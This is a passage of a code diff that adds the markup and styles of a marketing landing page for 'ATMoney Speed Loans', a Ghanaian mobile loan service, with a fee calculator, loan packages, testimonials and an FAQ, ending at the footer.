+      box-shadow:var(--shadow-lg); min-width:290px;
+      transform:translateY(20px) scale(.95); opacity:0; transition:all .35s ease;
+    }
+    .toast.show { transform:translateY(0) scale(1); opacity:1; }
+    .toast-icon { font-size:20px; flex-shrink:0; }
+    .toast-msg { font-size:14.5px; color:var(--text-dark); font-weight:700; font-family: var(--font-body); }
+    .toast-sub { font-size:11.5px; color:var(--text-muted); margin-top:2px; font-family: var(--font-body); }
+    .toast-bar {
+      position:absolute; bottom:0; left:0; height:3px;
+      background:var(--red); border-radius:0 0 var(--radius-md) var(--radius-md);
+      animation:toastBar 3.5s linear forwards;
+    }
+    @keyframes toastBar { from{width:100%} to{width:0%} }
+
+    /* ══ CHAT FAB ══ */
+    .chat-fab {
+      position:fixed; bottom:26px; left:26px; z-index:1000;
+      background:var(--red); border:none; border-radius:50px;
+      padding:12px 22px; cursor:pointer;
+      box-shadow:0 6px 24px rgba(227,6,19,.42);
+      display:flex; align-items:center; gap:10px;
+      transition:all .25s; color:#fff;
+    }
+    .chat-fab:hover { background:var(--red-dark); transform:translateY(-2px); box-shadow:0 10px 32px rgba(227,6,19,.5); }
+    .chat-fab-icon {
+      width:32px; height:32px; background:rgba(255,255,255,.18); border-radius:50%;
+      display:flex; align-items:center; justify-content:center; font-size:16px; flex-shrink:0;
+    }
+    .chat-fab-text { font-family: var(--font-body); font-size:12px; font-weight:700; }
+    .chat-fab-dot {
+      position:absolute; top:-3px; right:-3px;
+      width:12px; height:12px; background:#22C55E; border-radius:50%;
+      border:2px solid #fff; animation:pulse 1.6s infinite;
+    }
+
+    /* ══ RESPONSIVE ══ */
+    @media(max-width:1080px) {
+      .benefits-grid { grid-template-columns:repeat(2,1fr); }
+      .loans-grid { grid-template-columns:repeat(2,1fr); }
+      .footer-grid { grid-template-columns:1fr 1fr; }
+    }
+    @media(max-width:900px) {
+      .calc-wrap { grid-template-columns:1fr; }
+      .steps-grid { grid-template-columns:1fr; }
+      .step-connector { display:none; }
+      nav { display:none; }
+      .hamburger { display:flex; }
+      .btn-apply-header,.btn-login { display:none; }
+      .stats-bar-inner { grid-template-columns:repeat(2,1fr); }
+      .stat-item { border-bottom:1px solid var(--border); }
+      header { padding:0 18px; height:60px; }
+      .mobile-menu { top:60px; }
+    }
+    @media(max-width:640px) {
+      section { padding:60px 18px; }
+      .hero { height:auto; min-height:90vh; max-height:none; }
+      .slide-content { padding:0 24px; }
+      .slide h1 { font-size:38px; letter-spacing:-1px; }
+      .loans-grid { grid-template-columns:1fr; }
+      .benefits-grid { grid-template-columns:1fr; }
+      .footer-grid { grid-template-columns:1fr; }
+      .eligibility-inner { flex-direction:column; text-align:center; }
+      .stats-bar-inner { grid-template-columns:repeat(2,1fr); }
+      .stat-num { font-size:22px; }
+      .stat-item { padding:13px 10px; }
+      .modal { border-radius:var(--radius-lg); }
+      .slide-arrow { display:none; }
+      .brand-strip,.eligibility-strip { padding:22px 18px; }
+      footer { padding:48px 18px 26px; }
+      .amount-display-box { flex-direction:column; align-items:flex-start; gap:8px; }
+      .amount-manual-input { width:100%; }
+      .amount-big-display { font-size:28px; }
+      .review-card { flex:0 0 268px; width:268px; }
+      .calc-panel { padding:22px; }
+      .loan-amount { font-size:27px; }
+      .toast { right:14px; bottom:14px; left:14px; min-width:unset; }
+      .chat-fab-text { display:none; }
+      .chat-fab { padding:14px; border-radius:50%; }
+      .eligibility-strip { padding:24px 18px; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- TICKER -->
+<div class="ticker-bar">
+  <div class="ticker-track">
+    <div class="ticker-item">⚡ Up to GHS 50,000 instantly</div>
+    <div class="ticker-item">✓ Transparent service fee — simple & clear</div>
+    <div class="ticker-item">🏦 Funded by First Atlantic Bank (FAB)</div>
+    <div class="ticker-item">📱 ATMoney users only</div>
+    <div class="ticker-item">⏱ Approved in under 5 minutes</div>
+    <div class="ticker-item">🔒 Secure · Fast · Reliable</div>
+    <div class="ticker-item">🔄 Regular users unlock higher limits</div>
+    <!-- Duplicate for loop -->
+    <div class="ticker-item">⚡ Up to GHS 50,000 instantly</div>
+    <div class="ticker-item">✓ Transparent service fee — simple & clear</div>
+    <div class="ticker-item">🏦 Funded by First Atlantic Bank (FAB)</div>
+    <div class="ticker-item">📱 ATMoney users only</div>
+    <div class="ticker-item">⏱ Approved in under 5 minutes</div>
+    <div class="ticker-item">🔒 Secure · Fast · Reliable</div>
+    <div class="ticker-item">🔄 Regular users unlock higher limits</div>
+  </div>
+</div>
+
+<!-- HEADER -->
+<header>
+  <a href="#home" class="logo">
+    <img src="logo.png" alt="ATMoney Logo" class="logo-mark" style="width: 40px; height: 40px; object-fit: contain; border-radius: 50%; background: white; padding: 2px;">
+    <div class="logo-text-wrap">
+      <div class="logo-name">ATMoney<span>Speed Loans</span></div>
+      <div class="logo-sub">Life is Simple</div>
+    </div>
+  </a>
+  
+  <nav>
+    <a href="#home" class="active">Home</a>
+    <a href="#benefits">Benefits</a>
+    <a href="#how">How It Works</a>
+    <a href="#loans">Loans</a>
+    <a href="#faq">FAQ</a>
+  </nav>
+  
+  <div class="header-right">
+    <button class="btn-login" onclick="openLoginModal()">Login</button>
+    <button class="btn-apply-header" onclick="openLoginModal()">Apply Now →</button>
+    <div class="hamburger" id="hamburger" onclick="toggleMenu()">
+      <span></span><span></span><span></span>
+    </div>
+  </div>
+</header>
+
+<!-- MOBILE MENU -->
+<div class="mobile-menu" id="mobileMenu">
+  <a href="#home" onclick="closeMenu()">Home</a>
+  <a href="#benefits" onclick="closeMenu()">Benefits</a>
+  <a href="#how" onclick="closeMenu()">How It Works</a>
+  <a href="#loans" onclick="closeMenu()">Loans</a>
+  <a href="#faq" onclick="closeMenu()">FAQ</a>
+  <div class="mobile-menu-actions">
+    <button class="btn-login" onclick="openLoginModal(); closeMenu()">Login</button>
+    <button class="btn-apply-header" onclick="openLoginModal(); closeMenu()">Apply Now →</button>
+  </div>
+</div>
+
+<!-- HERO -->
+<section class="hero" id="home">
+  <div class="slides">
+    <div class="slide active">
+      <div class="slide-bg"></div>
+      <div class="slide-geo"></div>
+      <div class="slide-content">
+        <div class="slide-tag"><div class="dot"></div>🇬🇭 Available Across Ghana</div>
+        <h1>Get Cash <br><em>Instantly.</em><br><span class="thin">No Paperwork.</span></h1>
+        <p>ATMoney Speed Loans gives eligible ATMoney subscribers instant access to mobile credit — deposited directly to your wallet in minutes, 24/7.</p>
+        <div class="slide-btns">
+          <button class="btn-hero-primary" onclick="openLoginModal()">Get Your Loan ⚡</button>
+          <button class="btn-hero-secondary" onclick="scrollTo('calc')">Calculate First →</button>
+        </div>
+      </div>
+    </div>
+    <div class="slide">
+      <div class="slide-bg"></div>
+      <div class="slide-geo"></div>
+      <div class="slide-content">
+        <div class="slide-tag"><div class="dot"></div>🏦 Funded by First Atlantic Bank</div>
+        <h1>Up To <br><em>GHS 50,000</em><br><span class="thin">In Minutes.</span></h1>
+        <p>Borrow from GHS 100 to GHS 50,000 based on your ATMoney wallet activity. The more active you are, the more you unlock.</p>
+        <div class="slide-btns">
+          <button class="btn-hero-primary" onclick="openLoginModal()">Apply Now →</button>
+          <button class="btn-hero-secondary" onclick="scrollTo('loans')">View Packages</button>
+        </div>
+      </div>
+    </div>
+    <div class="slide">
+      <div class="slide-bg"></div>
+      <div class="slide-geo"></div>
+      <div class="slide-content">
+        <div class="slide-tag"><div class="dot"></div>📱 100% Mobile · Zero Queues</div>
+        <h1>Transparent <br><em>Fees.</em><br><span class="thin">Zero Surprises.</span></h1>
+        <p>One simple fee per period. See the exact amount, due date, and total repayment before you accept — every single time.</p>
+        <div class="slide-btns">
+          <button class="btn-hero-primary" onclick="openLoginModal()">Start Today ⚡</button>
+          <button class="btn-hero-secondary" onclick="scrollTo('faq')">Read FAQ</button>
+        </div>
+      </div>
+    </div>
+    <div class="slide">
+      <div class="slide-bg"></div>
+      <div class="slide-geo"></div>
+      <div class="slide-content">
+        <div class="slide-tag"><div class="dot"></div>🔄 Regular ATMoney Users Win More</div>
+        <h1>Transact More, <br><em>Unlock More.</em><br><span class="thin">Your Wallet Grows.</span></h1>
+        <p>The more you use ATMoney for payments, transfers, and daily transactions, the higher your loan eligibility becomes — automatically.</p>
+        <div class="slide-btns">
+          <button class="btn-hero-primary" onclick="openLoginModal()">Start Now →</button>
+          <button class="btn-hero-secondary" onclick="scrollTo('how')">See How It Works</button>
+        </div>
+      </div>
+    </div>
+    <div class="slide">
+      <div class="slide-bg"></div>
+      <div class="slide-geo"></div>
+      <div class="slide-content">
+        <div class="slide-tag"><div class="dot"></div>🤝 No Guarantor Required</div>
+        <h1>No Collateral. <br><em>No Stress.</em><br><span class="thin">Just Your Wallet.</span></h1>
+        <p>Your ATMoney wallet history is all you need. No guarantors, no collateral, no branch appointments — just fast, dignified mobile credit.</p>
+        <div class="slide-btns">
+          <button class="btn-hero-primary" onclick="openLoginModal()">Check Eligibility ⚡</button>
+          <button class="btn-hero-secondary" onclick="scrollTo('benefits')">See Benefits</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <div class="slide-dots">
+    <button class="slide-dot active" onclick="moveSlide(0)"></button>
+    <button class="slide-dot" onclick="moveSlide(1)"></button>
+    <button class="slide-dot" onclick="moveSlide(2)"></button>
+    <button class="slide-dot" onclick="moveSlide(3)"></button>
+    <button class="slide-dot" onclick="moveSlide(4)"></button>
+  </div>
+  
+  <button class="slide-arrow prev" onclick="moveSlide(-1)">←</button>
+  <button class="slide-arrow next" onclick="moveSlide(1)">→</button>
+</section>
+
+<!-- STATS BAR -->
+<div class="stats-bar">
+  <div class="stats-bar-inner">
+    <div class="stat-item">
+      <span class="stat-num">GHS 50K</span>
+      <span class="stat-label">Maximum Loan</span>
+    </div>
+    <div class="stat-item">
+      <span class="stat-num">&lt; 5 Min</span>
+      <span class="stat-label">Approval Time</span>
+    </div>
+    <div class="stat-item">
+      <span class="stat-num">6 Months</span>
+      <span class="stat-label">Max Loan Term</span>
+    </div>
+    <div class="stat-item">
+      <span class="stat-num">8.9%</span>
+      <span class="stat-label">Base Monthly Fee</span>
+    </div>
+  </div>
+</div>
+
+<!-- CALCULATOR -->
+<section class="calc-section" id="calc">
+  <div class="container">
+    <div class="text-center">
+      <div class="section-tag">Loan Calculator</div>
+      <h2 class="section-title">Know Your <span>Numbers</span></h2>
+      <div class="accent-bar"></div>
+      <p class="section-sub">Adjust the sliders or type your exact amount and duration. See your full breakdown before you apply — no surprises.</p>
+    </div>
+    
+    <div class="calc-wrap">
+      <div class="calc-panel">
+        <div class="calc-panel-header">
+          <div class="calc-panel-icon">🧮</div>
+          <div>
+            <h3>Loan Parameters</h3>
+            <p>Slide or type to set your amount & duration</p>
+          </div>
+        </div>
+        
+        <div class="calc-row">
+          <div class="calc-field-label">Loan Amount (GHS)</div>
+          <div class="amount-display-box">
+            <div class="amount-big-display">GHS <span id="amountDisplay">1,000</span></div>
+            <input type="number" class="amount-manual-input" id="amountInput" value="1000" placeholder="Type amount" oninput="onManualAmount()">
+          </div>
+          <input type="range" id="amountSlider" min="100" max="50000" step="100" value="1000" oninput="updateCalc()">
+          <div class="range-labels">
+            <span>GHS 100</span>
+            <span>GHS 25,000</span>
+            <span>GHS 50,000</span>
+          </div>
+          <div class="quick-chips" id="amountChips">
+            <div class="chip" onclick="setAmount(500)">GHS 500</div>
+            <div class="chip active" onclick="setAmount(1000)">GHS 1,000</div>
+            <div class="chip" onclick="setAmount(5000)">GHS 5,000</div>
+            <div class="chip" onclick="setAmount(10000)">GHS 10,000</div>
+            <div class="chip" onclick="setAmount(25000)">GHS 25,000</div>
+            <div class="chip" onclick="setAmount(50000)">GHS 50,000</div>
+          </div>
+        </div>
+        
+        <div class="calc-row">
+          <div class="calc-field-label">Loan Duration</div>
+          <div class="amount-display-box">
+            <div class="amount-big-display"><span id="daysDisplay">1</span> <span id="daysUnit" style="color:var(--text-muted); font-size:18px; font-weight:600;">Month</span></div>
+          </div>
+          <div class="quick-chips" id="daysChips">
+            <div class="chip" onclick="setPeriod(7)">7 Days</div>
+            <div class="chip" onclick="setPeriod(14)">14 Days</div>
+            <div class="chip" onclick="setPeriod(21)">21 Days</div>
+            <div class="chip active" onclick="setPeriod(30)">1 Month</div>
+            <div class="chip" onclick="setPeriod(60)">2 Months</div>
+            <div class="chip" onclick="setPeriod(90)">3 Months</div>
+            <div class="chip" onclick="setPeriod(120)">4 Months</div>
+            <div class="chip" onclick="setPeriod(150)">5 Months</div>
+            <div class="chip" onclick="setPeriod(180)">6 Months</div>
+          </div>
+        </div>
+      </div>
+      
+      <div class="calc-results">
+        <div class="results-header">
+          <h3>Your Loan Summary</h3>
+          <p>Based on your current selection — full breakdown before you commit</p>
+        </div>
+        
+        <div class="res-row">
+          <div class="res-icon">💰</div>
+          <div class="res-info">
+            <div class="res-label">Amount You Receive</div>
+            <div class="res-val" id="receiveAmt">GHS 1,000.00</div>
+          </div>
+        </div>
+        
+        <div class="res-row">
+          <div class="res-icon">📅</div>
+          <div class="res-info">
+            <div class="res-label">Loan Period</div>
+            <div class="res-val" id="periodDisplay">1 Month (30 Days)</div>
+          </div>
+        </div>
+        
+        <div class="res-row">
+          <div class="res-icon">📋</div>
+          <div class="res-info">
+            <div class="res-label">Service Fee</div>
+            <div class="res-val" id="feeAmt">GHS 89.00 (8.90%)</div>
+          </div>
+        </div>
+        
+        <div class="res-total">
+          <div class="res-label" style="color:rgba(255,255,255,.6)">Total To Repay</div>
+          <div class="res-val" id="repayAmt">GHS 1,089.00</div>
+        </div>
+        
+        <div class="calc-warning">
+          <span>⚠️</span>
+          <p><strong>Late payment fee:</strong> A one-time 12.5% penalty applies if not repaid by due date. Always repay on time to protect your limit.</p>
+        </div>
+        
+        <button class="btn-calc-apply" style="margin-top:26px;" onclick="openLoginModal()">Apply For This Loan ⚡</button>
+      </div>
+    </div>
+    
+    <div class="calc-panel" style="margin-top:28px; background:var(--red-pale); border-color:var(--red-border);">
+      <div style="display:flex; gap:20px; align-items:center; flex-wrap:wrap;">
+        <div style="font-size:38px; flex-shrink:0;">📱</div>
+        <div style="flex:1;">
+          <h3 style="font-size:16px; margin-bottom:6px;">ATMoney Users Only — The More You Transact, The More You Unlock</h3>
+          <p style="font-size:12.5px; color:var(--text-muted); line-height:1.65;">This loan service is exclusively for active ATMoney wallet holders aged 18+. Regular ATMoney users who consistently transact — send money, buy airtime, pay bills — enjoy significantly higher eligibility limits. The more active your wallet, the bigger the amount you can borrow. Funded by First Atlantic Bank (FAB).</p>
+        </div>
+        <button class="btn-hero-primary" style="box-shadow:none; padding:12px 24px;" onclick="openLoginModal()">Check My Eligibility →</button>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- LOAN PACKAGES -->
+<section class="loans-section" id="loans">
+  <div class="container">
+    <div class="text-center">
+      <div class="section-tag">Loan Packages</div>
+      <h2 class="section-title">Choose Your <span>Amount</span></h2>
+      <div class="accent-bar"></div>
+      <p class="section-sub">All loans credited directly to your ATMoney wallet — fast, transparent, and flexible. Available only to ATMoney users.</p>
+    </div>
+    
+    <div class="loans-grid">
+      <div class="loan-card">
+        <div class="loan-icon">🌱</div>
+        <div class="loan-name">Starter Flex</div>
+        <div class="loan-amount">GHS 500</div>
+        <div class="loan-period-tag">30-Day Loan</div>
+        <div class="loan-features">
+          <div class="loan-feat"><span class="loan-feat-label">Service Fee (8.9%)</span><span class="loan-feat-val">GHS 44.50</span></div>
+          <div class="loan-feat"><span class="loan-feat-label">Total Repay</span><span class="loan-feat-val">GHS 544.50</span></div>
+        </div>
+        <button class="loan-select-btn" onclick="selectLoan(500, 30)">Select This Loan →</button>
+      </div>
+      
+      <div class="loan-card">
+        <div class="loan-icon">⚡</div>
+        <div class="loan-name">Basic Flex</div>
+        <div class="loan-amount">GHS 1,000</div>
+        <div class="loan-period-tag">30-Day Loan</div>
+        <div class="loan-features">
+          <div class="loan-feat"><span class="loan-feat-label">Service Fee (8.9%)</span><span class="loan-feat-val">GHS 89.00</span></div>
+          <div class="loan-feat"><span class="loan-feat-label">Total Repay</span><span class="loan-feat-val">GHS 1,089</span></div>
+        </div>
+        <button class="loan-select-btn" onclick="selectLoan(1000, 30)">Select This Loan →</button>
+      </div>
+      
+      <div class="loan-card popular">
+        <div class="popular-badge">Most Popular 🔥</div>
+        <div class="loan-icon">🔥</div>
+        <div class="loan-name">Power Flex</div>
+        <div class="loan-amount">GHS 5,000</div>
+        <div class="loan-period-tag">30-Day Loan</div>
+        <div class="loan-features">
+          <div class="loan-feat"><span class="loan-feat-label">Service Fee (8.9%)</span><span class="loan-feat-val">GHS 445.00</span></div>
+          <div class="loan-feat"><span class="loan-feat-label">Total Repay</span><span class="loan-feat-val">GHS 5,445</span></div>
+        </div>
+        <button class="loan-select-btn" onclick="selectLoan(5000, 30)">Select This Loan →</button>
+      </div>
+      
+      <div class="loan-card">
+        <div class="loan-icon">💼</div>
+        <div class="loan-name">Business Flex</div>
+        <div class="loan-amount">GHS 10,000</div>
+        <div class="loan-period-tag">30-Day Loan</div>
+        <div class="loan-features">
+          <div class="loan-feat"><span class="loan-feat-label">Service Fee (8.9%)</span><span class="loan-feat-val">GHS 890.00</span></div>
+          <div class="loan-feat"><span class="loan-feat-label">Total Repay</span><span class="loan-feat-val">GHS 10,890</span></div>
+        </div>
+        <button class="loan-select-btn" onclick="selectLoan(10000, 30)">Select This Loan →</button>
+      </div>
+      
+      <div class="loan-card">
+        <div class="loan-icon">🏆</div>
+        <div class="loan-name">Elite Flex</div>
+        <div class="loan-amount">GHS 25,000</div>
+        <div class="loan-period-tag">30-Day Loan</div>
+        <div class="loan-features">
+          <div class="loan-feat"><span class="loan-feat-label">Service Fee (8.9%)</span><span class="loan-feat-val">GHS 2,225</span></div>
+          <div class="loan-feat"><span class="loan-feat-label">Total Repay</span><span class="loan-feat-val">GHS 27,225</span></div>
+        </div>
+        <button class="loan-select-btn" onclick="selectLoan(25000, 30)">Select This Loan →</button>
+      </div>
+      
+      <div class="loan-card">
+        <div class="loan-icon">👑</div>
+        <div class="loan-name">Premium Flex</div>
+        <div class="loan-amount">GHS 50,000</div>
+        <div class="loan-period-tag">30-Day Loan</div>
+        <div class="loan-features">
+          <div class="loan-feat"><span class="loan-feat-label">Service Fee (8.9%)</span><span class="loan-feat-val">GHS 4,450</span></div>
+          <div class="loan-feat"><span class="loan-feat-label">Total Repay</span><span class="loan-feat-val">GHS 54,450</span></div>
+        </div>
+        <button class="loan-select-btn" onclick="selectLoan(50000, 30)">Select This Loan →</button>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- HOW IT WORKS -->
+<section class="how-section" id="how">
+  <div class="container">
+    <div class="text-center">
+      <div class="section-tag">Process</div>
+      <h2 class="section-title">3 Simple <span>Steps</span></h2>
+      <div class="accent-bar"></div>
+      <p class="section-sub">Fully digital, no branches, no queues. Your loan in minutes. Only for ATMoney users.</p>
+    </div>
+    
+    <div class="steps-grid">
+      <div class="step-connector"></div>
+      <div class="step-card">
+        <div class="step-num">1</div>
+        <h3>Verify Your Number</h3>
+        <p>Enter your ATMoney phone number. We instantly confirm you're an active ATMoney wallet holder aged 18+. No paperwork, no ID scans, no branch visit needed.</p>
+      </div>
+      <div class="step-card">
+        <div class="step-num">2</div>
+        <h3>Choose Your Amount & Period</h3>
+        <p>Pick your loan from GHS 100 to GHS 50,000 and choose your repayment period — 7 days up to 6 months. Review the full breakdown before you accept.</p>
+      </div>
+      <div class="step-card">
+        <div class="step-num">3</div>
+        <h3>Receive Instantly</h3>
+        <p>Once approved, funds are sent straight to your ATMoney wallet in under 5 minutes — available 24 hours, 7 days a week, every day of the year.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- BENEFITS -->
+<section class="benefits-section" id="benefits">
+  <div class="container">
+    <div class="text-center">
+      <div class="section-tag">Why ATMoney Flex</div>
+      <h2 class="section-title">Built For <span>Ghana.</span> Built For You.</h2>
+      <div class="accent-bar"></div>
+      <p class="section-sub">Real banking convenience, real mobile speed — made exclusively for ATMoney users across Ghana. The more you transact, the more you qualify for.</p>
+    </div>
+    <div class="benefits-grid">
+      <div class="benefit-card">
+        <div class="benefit-icon-wrap">⚡</div>
+        <h3>Instant Disbursement</h3>
+        <p>Approved loans hit your ATMoney wallet in under 5 minutes — any time of day or night, including weekends and public holidays.</p>
+      </div>
+      <div class="benefit-card">
+        <div class="benefit-icon-wrap">🏦</div>
+        <h3>Bank-Level Security</h3>
+        <p>Funded by First Atlantic Bank (FAB) and secured by AT Ghana's enterprise-grade mobile infrastructure. Your money is safe.</p>
+      </div>
+      <div class="benefit-card">
+        <div class="benefit-icon-wrap">📱</div>
+        <h3>100% Mobile</h3>
+        <p>Apply, manage, and repay entirely from your phone — via USSD or this portal. Zero branch visits, zero queues, zero hassle.</p>
+      </div>
+      <div class="benefit-card">
+        <div class="benefit-icon-wrap">✅</div>
+        <h3>Transparent Fees</h3>
+        <p>You see the exact fee, due date, and total repayment before accepting. Zero hidden charges. What we show is precisely what we charge.</p>
+      </div>
+      <div class="benefit-card">
+        <div class="benefit-icon-wrap">🔄</div>
+        <h3>Flexible Repayment</h3>
+        <p>Choose from 7 days to 6 months. Repay early or partially anytime with no penalty. Automatic deduction on due date keeps you on track.</p>
+      </div>
+      <div class="benefit-card">
+        <div class="benefit-icon-wrap">📊</div>
+        <h3>Transact More, Borrow More</h3>
+        <p>The more you use ATMoney daily — payments, transfers, airtime — the higher your loan eligibility automatically grows. Activity is rewarded.</p>
+      </div>
+      <div class="benefit-card">
+        <div class="benefit-icon-wrap">🌍</div>
+        <h3>Ghana-Wide Coverage</h3>
+        <p>Active in every region of Ghana — from Accra and Kumasi to Tamale and Takoradi. Wherever you are, AT finds you.</p>
+      </div>
+      <div class="benefit-card">
+        <div class="benefit-icon-wrap">🤝</div>
+        <h3>No Guarantor Needed</h3>
+        <p>No collateral, no guarantor, no stress. Your ATMoney wallet history is all that's needed to determine your eligibility and limit.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- REVIEWS -->
+<section class="reviews-section" id="reviews">
+  <div class="container">
+    <div class="text-center">
+      <div class="section-tag">Testimonials</div>
+      <h2 class="section-title">What Our <span>Users Say</span></h2>
+      <div class="accent-bar"></div>
+      <p class="section-sub">Real ATMoney users across Ghana sharing their Speed Loan experience.</p>
+    </div>
+  </div>
+  <div class="reviews-track-wrap" style="margin-top:48px;">
+    <div class="reviews-track" id="reviewsTrack">
+      <div class="review-card"><div class="stars">★★★★★</div><div class="review-text">"I needed money for an emergency at midnight. Within 4 minutes the GHS 2,000 was in my ATMoney wallet. I couldn't believe how fast it was!"</div><div class="reviewer"><div class="avatar" style="background:#E30613">AK</div><div><div class="reviewer-name">Abena Kyerewaa</div><div class="reviewer-role">Market Trader, Kumasi</div></div></div></div>
+      <div class="review-card"><div class="stars">★★★★★</div><div class="review-text">"No paperwork, no office visits — I applied on USSD and had my GHS 5,000 immediately. The fees are clear upfront with no surprises at all."</div><div class="reviewer"><div class="avatar" style="background:#374151">KA</div><div><div class="reviewer-name">Kwame Asante</div><div class="reviewer-role">Driver, Accra</div></div></div></div>
+      <div class="review-card"><div class="stars">★★★★★</div><div class="review-text">"I repaid early and it was seamless. They deducted exactly what they showed me upfront — nothing extra. Very trustworthy service indeed."</div><div class="reviewer"><div class="avatar" style="background:#4B5563">AO</div><div><div class="reviewer-name">Akosua Obeng</div><div class="reviewer-role">Teacher, Cape Coast</div></div></div></div>
+      <div class="review-card"><div class="stars">★★★★☆</div><div class="review-text">"As a small business owner I use ATMoney Flex regularly to restock. The GHS 10,000 limit is perfect for my needs. Highly recommend to all traders."</div><div class="reviewer"><div class="avatar" style="background:#E30613">YB</div><div><div class="reviewer-name">Yaw Boateng</div><div class="reviewer-role">Shop Owner, Takoradi</div></div></div></div>
+      <div class="review-card"><div class="stars">★★★★★</div><div class="review-text">"My daughter needed school fees urgently. The ATMoney Speed Loan saved the day — no humiliation of asking relatives. Fast, private, and dignified."</div><div class="reviewer"><div class="avatar" style="background:#6B7280">FA</div><div><div class="reviewer-name">Felicia Acheampong</div><div class="reviewer-role">Nurse, Tamale</div></div></div></div>
+      <div class="review-card"><div class="stars">★★★★★</div><div class="review-text">"The automatic deduction on due date means I never missed a payment. Smarter than any other loan app I've used. AT really built this right."</div><div class="reviewer"><div class="avatar" style="background:#374151">DM</div><div><div class="reviewer-name">Daniel Mensah</div><div class="reviewer-role">Freelancer, Accra</div></div></div></div>
+      <div class="review-card"><div class="stars">★★★★★</div><div class="review-text">"Got my GHS 500 micro loan in 3 minutes flat. Perfect for unexpected costs. I've used it four times now — always a smooth and quick experience."</div><div class="reviewer"><div class="avatar" style="background:#E30613">EO</div><div><div class="reviewer-name">Efua Owusu</div><div class="reviewer-role">Student, UG Legon</div></div></div></div>
+      <div class="review-card"><div class="stars">★★★★★</div><div class="review-text">"Unlike bank loans with all that documentation, AT just checks your wallet history. Approved in minutes. The fee is very fair for that speed."</div><div class="reviewer"><div class="avatar" style="background:#4B5563">KO</div><div><div class="reviewer-name">Kojo Opoku</div><div class="reviewer-role">Contractor, Kumasi</div></div></div></div>
+      <!-- Duplicate for seamless loop -->
+      <div class="review-card"><div class="stars">★★★★★</div><div class="review-text">"I needed money for an emergency at midnight. Within 4 minutes the GHS 2,000 was in my ATMoney wallet. I couldn't believe how fast it was!"</div><div class="reviewer"><div class="avatar" style="background:#E30613">AK</div><div><div class="reviewer-name">Abena Kyerewaa</div><div class="reviewer-role">Market Trader, Kumasi</div></div></div></div>
+      <div class="review-card"><div class="stars">★★★★★</div><div class="review-text">"No paperwork, no office visits — I applied on USSD and had my GHS 5,000 immediately. The fees are clear upfront with no surprises at all."</div><div class="reviewer"><div class="avatar" style="background:#374151">KA</div><div><div class="reviewer-name">Kwame Asante</div><div class="reviewer-role">Driver, Accra</div></div></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- FAQ -->
+<section class="faq-section" id="faq">
+  <div class="container">
+    <div class="text-center">
+      <div class="section-tag">FAQ</div>
+      <h2 class="section-title">Frequently Asked <span>Questions</span></h2>
+      <div class="accent-bar"></div>
+      <p class="section-sub">Everything you need to know about ATMoney Speed Loans.</p>
+    </div>
+    <div class="faq-wrap">
+      <div class="faq-item open">
+        <div class="faq-q" onclick="toggleFaq(this)"><span>What is ATMoney Speed Loan?</span><div class="faq-icon">+</div></div>
+        <div class="faq-a">Speed Loan is a mobile loan exclusively on ATMoney that allows eligible subscribers to borrow money directly into their ATMoney wallet — instantly, 24/7, without visiting a branch or providing paper documents. It is only for ATMoney wallet holders.</div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-q" onclick="toggleFaq(this)"><span>Who is eligible to apply?</span><div class="faq-icon">+</div></div>
+        <div class="faq-a">You must be 18 years or older with an active ATMoney wallet. This service is exclusively for ATMoney users — regular ATMoney subscribers without a ATMoney wallet are not eligible. Active, frequent ATMoney users (those who regularly send money, buy airtime, pay bills, and transact) enjoy higher eligibility and bigger loan limits.</div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-q" onclick="toggleFaq(this)"><span>Who funds the Speed Loan?</span><div class="faq-icon">+</div></div>
+        <div class="faq-a">The loan is funded by First Atlantic Bank (FAB), a fully licensed financial institution in Ghana. ATMoney Ghana facilitates access through the ATMoney mobile platform on behalf of FAB.</div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-q" onclick="toggleFaq(this)"><span>How does being a regular ATMoney user affect my limit?</span><div class="faq-icon">+</div></div>
+        <div class="faq-a">Your ATMoney wallet activity directly determines your loan eligibility. The more you transact — sending money, paying bills, buying airtime, receiving payments — the higher your assessed limit becomes. Regular, consistent use of ATMoney signals financial activity and trustworthiness, unlocking access to progressively larger loan amounts over time.</div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-q" onclick="toggleFaq(this)"><span>How do I apply for a Speed Loan?</span><div class="faq-icon">+</div></div>
+        <div class="faq-a">You can apply right here on this portal by clicking "Apply Now" or via USSD on your phone. Simply enter your number, choose your loan amount and period, and once approved, the funds are sent directly to your ATMoney wallet.</div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-q" onclick="toggleFaq(this)"><span>What fees are charged?</span><div class="faq-icon">+</div></div>
+        <div class="faq-a">We charge a simple, transparent service fee based on the loan amount and duration. The base rate is 8.9% per month. You will always see the exact fee amount before you accept the loan. No hidden charges.</div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-q" onclick="toggleFaq(this)"><span>What loan durations are available?</span><div class="faq-icon">+</div></div>
+        <div class="faq-a">You can choose repayment periods ranging from 7 days up to 6 months (180 days), depending on your eligibility and loan amount.</div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-q" onclick="toggleFaq(this)"><span>What will I see before accepting the loan?</span><div class="faq-icon">+</div></div>
+        <div class="faq-a">Before you confirm, you will see a clear summary: the amount you receive, the service fee, the total amount to repay, and the exact due date.</div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-q" onclick="toggleFaq(this)"><span>Can I have more than one active loan?</span><div class="faq-icon">+</div></div>
+        <div class="faq-a">Currently, you can only have one active Speed Loan at a time. Once you repay your current loan, you can immediately apply for another one.</div>
+      </div>
+      <div class="faq-item">
+        <div class="faq-q" onclick="toggleFaq(this)"><span>How do I repay the loan?</span><div class="faq-icon">+</div></div>
+        <div class="faq-a">Repayment is automatic from your ATMoney wallet on the due date. You can also make manual early repayments or partial repayments at any time through the portal or USSD without any penalty.</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- BRAND STRIP -->
+<div class="brand-strip">
+  <p>POWERED BY <span>ATMoney</span> GHANA &amp; FIRST ATLANTIC BANK</p>
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <div class="container">
+    <div class="footer-grid">
+      <div class="footer-col">
